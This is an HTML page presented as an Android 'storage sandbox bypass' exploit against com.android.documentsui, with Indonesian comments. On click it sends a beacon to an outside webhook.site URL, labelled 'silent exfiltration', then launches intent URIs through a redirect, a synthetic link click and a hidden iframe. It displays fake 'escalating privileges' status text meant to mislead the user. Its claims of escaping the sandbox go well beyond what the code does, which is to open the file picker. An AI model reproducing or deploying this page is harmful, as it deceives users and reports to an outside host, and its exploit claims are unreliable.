<!DOCTYPE html>
<html>
<head><title>Kernel Storage Sync</title></head>
<body style="background:#000;color:#0ff;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
    <div id="ignite" style="padding:60px;border:3px double #0ff;text-align:center;cursor:pointer;background:rgba(0,255,255,0.05);box-shadow:0 0 120px #0ff;border-radius:20px">
        <h1 style="letter-spacing:10px;margin:0">V219_STORAGE</h1>
        <div id="status" style="font-size:20px;margin:20px 0;color:#fff">BYPASSING_STORAGE_SANDBOX...</div>
        <div style="font-size:10px;color:#333">> TARGET: com.android.documentsui</div>
    </div>

<script>
    const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";

    document.getElementById('ignite').onclick = () => {
        // 1. SILENT EXFILTRATION
        navigator.sendBeacon(`${webhook}?v=V219_STORAGE_ATTEMPT`, btoa(Date.now()));

        // 2. THE STORAGE EXPLOIT VECTORS
        // Vector A: Memaksa membuka direktori Download (Sensitive Area)
        const targetA = "intent:#Intent;action=android.intent.action.VIEW;data=content://com.android.externalstorage.documents/root/primary;package=com.android.documentsui;end";
        
        // Vector B: Memicu File Picker untuk seluruh file sistem
        const targetB = "intent:#Intent;action=android.intent.action.GET_CONTENT;type=*/*;category=android.intent.category.OPENABLE;end";

        // Vector C: Direct Access ke Folder Media (Gallery/DCIM)
        const targetC = "intent:#Intent;action=android.intent.action.VIEW;type=image/*;package=com.android.documentsui;end";

        // 3. ATOMIC STRIKE
        document.getElementById('status').innerText = "ESCALATING_PRIVILEGES...";
        document.getElementById('status').style.color = "#f00";

        // Tembak secara berurutan dengan jeda minimal
        window.location.href = targetA;

        setTimeout(() => {
            // Force click via dynamic anchor
            const a = document.createElement('a');
            a.href = targetB;
            a.click();
        }, 150);

        // Fallback: Bypass via Iframe (Jika browser memblokir window.location)
        setTimeout(() => {
            if (!document.hidden) {
                const ifr = document.createElement('iframe');
                ifr.style.display = 'none';
                ifr.src = targetC;
                document.body.appendChild(ifr);
            }
        }, 400);

        // 4. CLEANUP: Redirect ke sistem palsu untuk membingungkan user
        setTimeout(() => {
            if (document.hidden) {
                console.log("SUCCESS: Sandbox Escaped.");
            }
        }, 1000);
    };
</script>
</body>
</html>
